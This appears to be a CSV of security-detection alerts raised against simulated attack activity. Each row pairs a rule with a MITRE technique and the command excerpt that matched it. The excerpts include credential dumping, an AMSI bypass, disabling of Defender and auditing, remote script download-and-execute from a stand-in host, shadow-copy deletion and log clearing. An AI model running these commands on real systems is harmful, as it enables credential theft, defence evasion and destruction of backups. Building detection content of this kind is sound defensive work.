timestamp,host,rule,severity,mitre,command_excerpt,matched_context
2026-01-15T09:16:00+00:00,SRV-DC01,NTDS.dit Dump Attempt,critical,T1003.003,ntdsutil ifm create full C:\Temp\ifm-simulated,ntdsutil ifm create full C:\Temp\ifm-simulated
2026-01-15T09:18:00+00:00,SRV-DC01,WDigest Credential Exposure,high,T1003.001,reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1,entControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1
2026-01-15T10:30:00+00:00,WS-601,AMSI Bypass String,high,T1562.001,powershell.exe [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'),y.GetType('System.Management.Automation.AmsiUtils')
2026-01-15T10:32:00+00:00,WS-601,Windows Audit Policy Disable,high,T1562.002,auditpol /set /success:disable /failure:disable,auditpol /set /success:disable /failure:disable
2026-01-15T10:34:00+00:00,WS-601,Firewall Rule Modification,medium,T1562.004,netsh advfirewall firewall add rule name=Demo dir=in action=allow protocol=TCP localport=4444,netsh advfirewall firewall add rule name=Demo dir=in action=allow protocol=
2026-01-15T10:36:00+00:00,WS-601,Microsoft Defender Disable Attempt,high,T1562.001,Add-MpPreference -ExclusionPath C:\Temp,Add-MpPreference -ExclusionPath C:\Temp
2026-01-15T09:35:00+00:00,WS-201,WinRM Remote Command,medium,T1021.006,Enter-PSSession -ComputerName WS-202,Enter-PSSession -ComputerName WS-202
2026-01-15T09:37:00+00:00,WS-202,PsExec Remote Service Pattern,high,T1569.002,psexec \\WS-203 -s cmd /c echo SIMULATED > C:\Temp\psexesvc.log,psexec \\WS-203 -s cmd /c echo SIMULATED > C:\
2026-01-15T09:39:00+00:00,WS-203,Windows Service Creation,medium,T1543.003,sc.exe create UpdateSvc binPath= C:\ProgramData\update-sim.exe,sc.exe create UpdateSvc binPath= C:\ProgramData\updat
2026-01-15T09:41:00+00:00,WS-203,WMI Process Creation,low,T1047,"wmic process call create ""cmd.exe /c echo lateral-movement-demo""","wmic process call create ""cmd.exe /c echo lateral-movement-demo"""
2026-01-15T09:55:00+00:00,WS-401,MSHTA Remote Load,medium,T1218.005,mshta http://example.local/demo.hta,mshta http://example.local/demo.hta
2026-01-15T09:57:00+00:00,WS-401,Rundll32 Remote Scriptlet,high,T1218.011,rundll32.exe javascript:SIMULATED,rundll32.exe javascript:SIMULATED
2026-01-15T09:59:00+00:00,WS-401,Regsvr32 Scriptlet Execution,high,T1218.010,regsvr32 /s /n /u /i:http://example.local/demo.sct scrobj.dll,regsvr32 /s /n /u /i:http://example.local/demo.sct scrobj.dll
2026-01-15T10:01:00+00:00,WS-401,CMSTP UAC Bypass Pattern,high,T1218.003,cmstp.exe /s C:\Temp\demo.inf,cmstp.exe /s C:\Temp\demo.inf
2026-01-15T10:03:00+00:00,WS-401,MSBuild Inline Task Execution,medium,T1127.001,msbuild.exe C:\Temp\demo.proj /target:Build,msbuild.exe C:\Temp\demo.proj /target:Build
2026-01-15T10:05:00+00:00,WS-401,InstallUtil Proxy Execution,medium,T1218.004,installutil.exe /logfile= /u C:\Temp\demo.dll,installutil.exe /logfile= /u C:\Temp\demo.dll
2026-01-15T10:07:00+00:00,WS-401,Forfiles Proxy Execution,low,T1202,forfiles /p C:\Windows /m notepad.exe /c cmd /c echo SIMULATED,forfiles /p C:\Windows /m notepad.exe /c cmd /c ech
2026-01-15T10:20:00+00:00,WS-501,Registry Run Key Modification,low,T1547.001,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v DemoUpdater /d C:\ProgramData\demo-updater.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v DemoUpdater /d C:\ProgramData\demo-u
2026-01-15T10:22:00+00:00,WS-501,Scheduled Task Creation,low,T1053.005,schtasks /create /tn DemoUpdater /tr C:\ProgramData\demo-updater.exe /sc minute /mo 30,schtasks /create /tn DemoUpdater /tr C:\ProgramData\demo
2026-01-15T10:24:00+00:00,WS-501,Windows Service Creation,medium,T1543.003,sc create DemoUpdater binPath= C:\ProgramData\demo-updater.exe,sc create DemoUpdater binPath= C:\ProgramData\dem
2026-01-15T10:26:00+00:00,WS-501,PowerShell New-Service Persistence,medium,T1543.003,New-Service -Name DemoSvc -BinaryPathName C:\ProgramData\demo-svc.exe,New-Service -Name DemoSvc -BinaryPathName C:\Progra
2026-01-15T09:00:00+00:00,WS-101,PowerShell Bypass/Hidden Flags,medium,T1059.001,powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Write-Output SIMULATED,powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy By
2026-01-15T09:02:00+00:00,WS-101,Encoded PowerShell Command,medium,T1059.001,powershell.exe [REDACTED] [BASE64...REDACTED],powershell.exe [REDACTED] [BASE64...REDACTED]
2026-01-15T09:04:00+00:00,WS-101,Suspicious Web Download,medium,T1105,powershell.exe [REDACTED] https://example.local/stage1.ps1 -OutFile C:\ProgramData\stage1.ps1,powershell.exe [REDACTED] https://example.local/stage1.ps1 -OutFi
2026-01-15T09:06:00+00:00,WS-101,Suspicious Web Download,medium,T1105,powershell.exe IEX ([REDACTED]).DownloadString('https://example.local/bootstrap.txt'),powershell.exe IEX ([REDACTED]).DownloadString('https://example.local/
2026-01-15T09:06:00+00:00,WS-101,PowerShell DownloadString Execution,high,T1059.001,powershell.exe IEX ([REDACTED]).DownloadString('https://example.local/bootstrap.txt'),hell.exe IEX ([REDACTED]).DownloadString('https://example.local/bootstrap.txt')
2026-01-15T09:06:00+00:00,WS-101,PowerShell Invoke-Expression,medium,T1059.001,powershell.exe IEX ([REDACTED]).DownloadString('https://example.local/bootstrap.txt'),powershell.exe IEX ([REDACTED]).DownloadStrin
2026-01-15T09:20:00+00:00,FS-01,Microsoft Defender Disable Attempt,high,T1562.001,Set-MpPreference -[BASE64...REDACTED] $true,Set-MpPreference -[BASE64...REDACTED] $true
2026-01-15T09:22:00+00:00,FS-01,Recovery Inhibition,high,T1490,vssadmin delete shadows /all /quiet,vssadmin delete shadows /all /quiet
2026-01-15T09:22:00+00:00,FS-01,Ransomware Shadow Copy Removal Variant,critical,T1490,vssadmin delete shadows /all /quiet,vssadmin delete shadows /all /quiet
2026-01-15T09:24:00+00:00,FS-01,Recovery Inhibition,high,T1490,wbadmin delete catalog -quiet,wbadmin delete catalog -quiet
2026-01-15T09:24:00+00:00,FS-01,Ransomware Shadow Copy Removal Variant,critical,T1490,wbadmin delete catalog -quiet,wbadmin delete catalog -quiet
2026-01-15T09:26:00+00:00,FS-01,Recovery Inhibition,high,T1490,bcdedit /set recoveryenabled no,bcdedit /set recoveryenabled no
2026-01-15T09:30:00+00:00,FS-01,Windows Event Log Clear,high,T1070.001,wevtutil cl Security,wevtutil cl Security
2026-01-15T10:40:00+00:00,WS-701,Browser Credential Store Access,medium,T1555.003,"cmd.exe /c dir ""C:\Users\designer\AppData\Local\Google\Chrome\User Data\Default\Login Data""","a\Local\Google\Chrome\User Data\Default\Login Data"""
2026-01-15T10:42:00+00:00,WS-701,Clipboard Data Access,low,T1115,powershell.exe Get-Clipboard,powershell.exe Get-Clipboard
2026-01-15T10:44:00+00:00,WS-701,Screen Capture,medium,T1113,"powershell.exe Add-Type -AssemblyName System.Drawing; Graphics.CopyFromScreen(0,0,0,0,0)"," -AssemblyName System.Drawing; Graphics.CopyFromScreen(0,0,0,0,0)"
2026-01-15T10:46:00+00:00,WS-701,Archive Collected Files,low,T1560.001,Compress-Archive C:\Users\designer\Documents C:\Temp\documents.zip,Compress-Archive C:\Users\designer\Documents C:\Temp\doc
